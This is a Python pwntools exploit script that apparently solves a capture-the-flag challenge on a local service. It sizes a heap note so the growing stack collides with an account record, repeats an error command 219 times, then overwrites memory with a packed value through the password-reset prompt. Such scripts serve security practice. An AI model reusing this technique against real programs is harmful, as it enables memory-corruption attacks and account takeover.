from pwn import *

io = remote("127.0.0.1", 1337)

print(io.recvuntil(b"Command").decode("utf-8"))

note_size = 0x2fbb8 - 32

# First, create a phantom note
# it should be big enough so that there is only enough space left for a new account, with no free chunk left
# that way, the stack will be able to hit the account without triggering the heap guard
io.send(b"k")
io.recvuntil(b"Secret key size:")
io.sendline(str(note_size).encode())  # size is heap_size - (sizeof(struct account) + 2 * sizeof(chunk_hdr))
io.recvuntil(b"Secret key content:")
io.sendline(b"")

print(io.recvuntil(b"Command:").decode("utf-8"))

io.send(b"c")
io.recvuntil(b"Name:")
io.sendline(b"rmalmain")
io.recvuntil(b"Password:")
io.sendline(b"SuperImportantPassword")
print(io.recvuntil(b"Command:").decode("utf-8"))

io.send(b"u")
io.recvuntil(b"Account password:")
io.sendline(b"SuperImportantPassword")
print(io.recvuntil(b"Command:").decode("utf-8"))

io.send(b"s")
print(io.recvuntil(b"Command:").decode("utf-8"))

# this number is found through trial and error
for i in range(219):
    print(f"Step {i}")
    io.send(b"w") # error command
    print(io.recvuntil("Command:").decode("utf-8"))

io.send(b"r")

print(io.recvuntil(b"New password:").decode("utf-8"))
io.sendline(b"PP" + p32(0xC4F3B4B3) * 31)

print(io.recvuntil(b"Repeat new password:").decode("utf-8"))
io.sendline(b"PP" + p32(0xC4F3B4B3) * 31)
print(io.recvuntil(b"Command:").decode("utf-8"))

io.send(b"z")
print(io.recvuntil(b"Command:").decode("utf-8"))

io.send(b"b")
print(io.recvuntil(b"Command:").decode("utf-8"))
